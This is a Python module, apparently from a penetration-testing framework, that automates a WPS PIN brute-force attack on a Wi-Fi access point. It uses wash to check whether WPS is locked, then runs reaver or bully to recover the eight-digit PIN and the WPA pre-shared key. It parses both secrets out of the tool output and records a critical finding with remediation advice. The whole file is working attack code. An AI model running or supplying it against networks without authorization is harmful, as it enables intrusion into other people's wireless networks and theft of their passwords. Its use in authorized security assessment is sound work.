"""WPS attack chain: wash detection -> reaver/bully brute force."""

from __future__ import annotations

import re

from ...core.runner import run_cmd, tool_available
from ..base import FindingDraft, ModuleContext, ModuleResult


def attack(ctx: ModuleContext) -> ModuleResult:
    interface = (ctx.params or {}).get("interface")
    bssid = (ctx.params or {}).get("bssid")
    channel = (ctx.params or {}).get("channel")
    if not (interface and bssid and channel):
        return ModuleResult(success=False, error="missing 'interface', 'bssid', or 'channel'")

    tool = (ctx.params or {}).get("tool", "reaver").lower()
    if tool not in ("reaver", "bully"):
        return ModuleResult(success=False, error="tool must be 'reaver' or 'bully'")
    if not tool_available(tool):
        return ModuleResult(success=False, error=f"{tool} not installed")
    if not tool_available("wash"):
        return ModuleResult(success=False, error="wash not installed (apt install reaver)")

    # Sanity check: confirm WPS is actually enabled + unlocked on the AP.
    wash_r = run_cmd(["wash", "-i", interface], timeout=20)
    locked = False
    for line in wash_r.stdout.splitlines():
        if bssid.lower() in line.lower():
            cols = line.split()
            # wash columns include LCK at varying positions; search for explicit Yes/No
            if any(c.lower() == "yes" for c in cols[-3:]):
                locked = True
                break

    if locked:
        return ModuleResult(success=False, error=f"WPS is locked on {bssid}; abort to avoid wasted time",
                            summary="wps: target is WPS-locked")

    timeout = int((ctx.params or {}).get("timeout", 7200))
    if tool == "reaver":
        cmd = ["reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-vv", "-N"]
    else:
        cmd = ["bully", interface, "-b", bssid, "-c", str(channel), "-d", "-v", "3"]

    r = run_cmd(cmd, timeout=timeout)
    pin = None
    psk = None
    pin_match = re.search(r"WPS PIN:\s*['\"]?(\d{8})", r.stdout)
    psk_match = re.search(r"WPA PSK:\s*['\"]?([^'\"\n]+)", r.stdout)
    if pin_match:
        pin = pin_match.group(1)
    if psk_match:
        psk = psk_match.group(1).strip()

    findings: list[FindingDraft] = []
    if pin or psk:
        findings.append(FindingDraft(
            title=f"WPS PIN brute-force succeeded against {bssid}",
            severity="critical",
            cwe="CWE-330",
            affected_component=f"WPS-enabled AP {bssid}",
            description=("The WPS protocol's split-PIN design allowed offline reconstruction "
                         "of the 8-digit PIN, which in turn yielded the WPA pre-shared key."),
            remediation=("Disable WPS on the access point. If WPS is required, ensure WPS Lock "
                         "engages after a small number of failed attempts."),
        ))

    return ModuleResult(
        success=bool(pin or psk),
        findings=findings,
        summary=(f"wps {tool}: pin={pin or 'not recovered'} psk={psk or 'not recovered'}"),
        extra={"pin": pin, "psk": psk, "locked": locked},
    )
